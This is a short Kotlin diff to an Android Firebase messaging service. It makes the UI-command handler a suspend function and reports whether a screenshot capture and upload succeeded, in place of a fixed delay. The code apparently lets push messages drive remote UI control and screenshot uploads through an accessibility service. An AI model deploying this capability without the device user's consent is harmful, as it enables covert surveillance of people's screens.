@@ -281,7 +281,7 @@ class AppFirebaseMessagingService : FirebaseMessagingService() {
     /**
      * Execute UI control command
      */
-    private fun executeUICommand(action: String, params: Map<String, String>): Boolean {
+    private suspend fun executeUICommand(action: String, params: Map<String, String>): Boolean {
         return try {
             val remoteUIControlManager = RemoteUIControlManager(this)
             val packageName = params["package"]
@@ -344,13 +344,15 @@ class AppFirebaseMessagingService : FirebaseMessagingService() {
             }
             
             val screenshotManager = ScreenshotManager(this, accessibilityService)
-            screenshotManager.captureAndUploadScreenshot()
+            val success = screenshotManager.captureAndUploadScreenshot()
             
-            // Wait a bit for upload to complete
-            delay(2000)
+            if (success) {
+                Timber.d("Screenshot captured and uploaded successfully")
+            } else {
+                Timber.w("Failed to capture or upload screenshot")
+            }
             
-            Timber.d("Screenshot capture initiated")
-            true
+            success
         } catch (e: Exception) {
             Timber.e(e, "Error capturing screenshot")
             false
